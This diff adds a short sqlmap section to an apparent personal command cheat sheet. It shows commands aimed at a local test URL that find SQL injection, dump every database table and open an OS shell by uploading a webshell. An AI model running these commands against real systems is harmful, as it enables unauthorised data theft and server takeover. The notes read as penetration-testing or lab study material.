@@ -277,4 +277,18 @@ jq .dependencies package.json
 http URL | jq .dependencies
 ```
 
+## sqlmap
+* `-u` specifies a target URL,  `-p` for parameters
+```bash
+sqlmap -u http://127.0.0.1/debug.php?id=1 -p "id"
+```
 
+* `--dbms=mysql` set the backend database to `mysql`,  `--dump` to dump the content for all tables. `sqlmap` cannot distinguish between `MariaDB` and `mysql`, so we can set them as the same
+```bash
+sqlmap -u http://127.0.0.1/debug.php?id=1 -p "id" --dbms=mysql --dump
+```
+
+* We can get a shell by using `--os-shell`, and it will upload a webshell to server like what I did earlier automatically!
+```bash
+sqlmap -u http://127.0.0.1/debug.php?id=1 -p "id" --dbms=mysql --os-shell
+```
